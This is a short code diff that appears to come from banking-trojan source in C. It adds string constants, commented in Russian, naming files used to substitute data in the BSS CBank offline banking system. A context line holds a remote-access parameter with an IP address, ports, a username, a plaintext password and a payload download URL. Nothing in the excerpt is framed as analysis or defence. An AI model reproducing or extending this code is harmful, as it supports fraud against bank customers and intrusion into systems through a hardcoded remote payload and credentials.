@@ -225,6 +225,16 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 
 CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";
 
+#ifdef BBSCBankH
+//для BSS CBank оффлайн
+//имя файла хранящий что подменять
+CSSTR CBankReplacement[] = "cbank_replacement.txt";
+//флаг для запуска подмены (был создан файл подмены)
+CSSTR CBankFlagUpdate[] = "cbank_flagupdate.txt"; 
+//файл с данными о подмене
+CSSTR CBankRestFixed[] = "cbank_restfixed.txt"; 
+#endif //BBSCBankH
+
 //=============================================================================
 // Конец блока шифрованных строк
 //=============================================================================
